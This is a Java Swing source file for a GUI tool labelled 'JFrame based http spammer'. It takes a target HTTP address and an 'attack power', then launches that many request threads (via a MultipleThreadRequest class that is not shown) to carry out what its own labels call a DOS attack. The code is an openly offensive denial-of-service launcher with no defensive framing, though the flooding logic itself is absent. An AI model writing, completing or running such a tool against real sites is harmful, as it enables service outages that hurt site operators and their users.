package network;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;

public class JframeForMR {

    public static void main(String... args) {
        // Create frame with title Registration Demo
        JFrame frame = new JFrame();
        frame.setTitle("JFrame based http spammer");
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        JPanel headingPanel = new JPanel();
        JLabel headingLabel = new JLabel("Preparing to DOS attack...");
        headingPanel.add(headingLabel);

        JPanel panel = new JPanel(new GridBagLayout());
        // Constraints for the layout
        GridBagConstraints constr = new GridBagConstraints();
        constr.insets = new Insets(5, 5, 5, 5);
        constr.anchor = GridBagConstraints.CENTER;
        // Setting initial grid values to 0, 0
        constr.gridx = 0;
        constr.gridy = 0;
        JLabel nameLabel = new JLabel("Enter http address:");
        JTextField nameInput = new JTextField(20);
        panel.add(nameLabel, constr);
        constr.gridx = 0;
        constr.gridy = 1;
        panel.add(nameInput, constr);
        constr.gridx = 0;
        constr.gridy = 2;
        constr.anchor = GridBagConstraints.CENTER;

        JLabel powerLabel = new JLabel("Enter power of attack(5000 and more):");
        panel.add(powerLabel, constr);
        constr.gridx = 0;
        constr.gridy = 3;
        JTextField powerInput = new JTextField(20);
        panel.add(powerInput, constr);
        constr.gridx = 0;
        constr.gridy = 4;

        // Button with text "Attack"
        JButton startButton = new JButton("Start");
        constr.gridx = 0;
        constr.gridy = 5;
        panel.add(startButton, constr);

        // Button with text "Stop"
        JButton endButton = new JButton("Stop");
        constr.gridx = 0;
        constr.gridy = 6;
        panel.add(endButton, constr);

        // add a listener to button Attack
        startButton.addActionListener(e -> {
            headingLabel.setText("DOS attack in progress... " + nameInput.getText());
            try {
                for (int i = 0; i < Integer.parseInt(powerInput.getText()); i++) {
                    MultipleThreadRequest request = new MultipleThreadRequest(nameInput.getText());
                    request.start();
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            nameInput.setText("");
        });

        // add a listener to button Attack
        endButton.addActionListener(e -> {
            headingLabel.setText("Stopping...");
            System.exit(-1);
        });

        mainPanel.add(headingPanel);
        mainPanel.add(panel);

        frame.add(mainPanel);
        frame.pack();
        frame.setSize(400, 400);
        frame.setLocationRelativeTo(null);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
    }

}
